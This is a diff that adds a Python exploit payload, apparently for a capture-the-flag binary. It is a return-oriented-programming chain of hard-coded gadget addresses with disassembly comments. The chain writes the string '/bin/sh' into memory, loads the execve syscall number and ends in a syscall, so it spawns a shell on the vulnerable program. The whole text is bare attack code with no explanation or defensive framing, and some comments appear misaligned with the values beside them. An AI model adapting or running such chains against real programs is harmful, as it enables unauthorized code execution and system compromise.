@@ -1,0 +1,47 @@
+payload = p64(0x469cd9)
+#0x0000000000469cd9: pop rsi; and bh, dh; ret; 
+payload += p64(0x4b0173)+p64(0x4017cc)
+# 0x00000000004017cc: pop r12; pop r13; pop r14; pop r15; ret; 
+payload += p64(0x7df0ee20)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x452df7)
+# 0x452df7: add qword ptr [rsi + 0xf], r12 ; ret
+payload += p64(0x469cd9)
+# 0x0000000000469cd9: pop rsi; and bh, dh; ret; 
+payload += p64(0x4b01b3)+p64(0x4017cc)
+# 0x00000000004017cc: pop r12; pop r13; pop r14; pop r15; ret; 
+payload += p64(0x486adb)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x452df7)
+# 0x452df7: add qword ptr [rsi + 0xf], r12 ; ret
+payload += p64(0x469cd9)
+# 0x0000000000469cd9: pop rsi; and bh, dh; ret; 
+payload += p64(0x4b01bd)+p64(0x4017cc)
+# 0x00000000004017cc: pop r12; pop r13; pop r14; pop r15; ret; 
+payload += p64(0x486adb)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x452df7)
+# 0x452df7: add qword ptr [rsi + 0xf], r12 ; ret
+payload += p64(0x469cd9)
+# 0x0000000000469cd9: pop rsi; and bh, dh; ret; 
+payload += p64(0x4b0061)+p64(0x4017cc)
+# 0x00000000004017cc: pop r12; pop r13; pop r14; pop r15; ret; 
+payload += p64(0x68662f6e69622f)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x452df7)
+# 0x452df7: add qword ptr [rsi + 0xf], r12 ; ret
+payload += p64(0x4017d3)
+# 0x00000000004017d3: pop rdi; ret; 
+payload += p64(0x4b0070)+p64(0x43035f)
+# 0x000000000043035f: mov edx, 0x820f11e0; ret; 
+payload += p64(0x469cd9)
+# 0x0000000000469cd9: pop rsi; and bh, dh; ret; 
+payload += p64(0x4b01c2)+p64(0x430b8e)
+# 0x0000000000430b8e: pop rcx; jmp qword ptr [rsi]; 
+payload += p64(0x401553)
+# 0x0000000000486adb: pop rax; mov bh, 0xe8; jmp rcx; 
+payload += p64(0x36baff97)
+# 0x0000000000401553: add edx, dword ptr [rax - 0x366ffe15]; ret; 
+payload += p64(0x469cd9)
+# 0x0000000000469cd9: pop rsi; and bh, dh; ret; 
+payload += p64(0x4b01cc)+p64(0x430b8e)
+# 0x0000000000430b8e: pop rcx; jmp qword ptr [rsi]; 
+payload += p64(0x469cd9)
+# 0x0000000000486adb: pop rax; mov bh, 0xe8; jmp rcx; 
+payload += p64(0x3b)
+# 0x0000000000469cd9: pop rsi; and bh, dh; ret; 
+payload += p64(0x0)+p64(0x413d0a)
+# 0x0000000000413d0a: syscall; 
+payload += b''
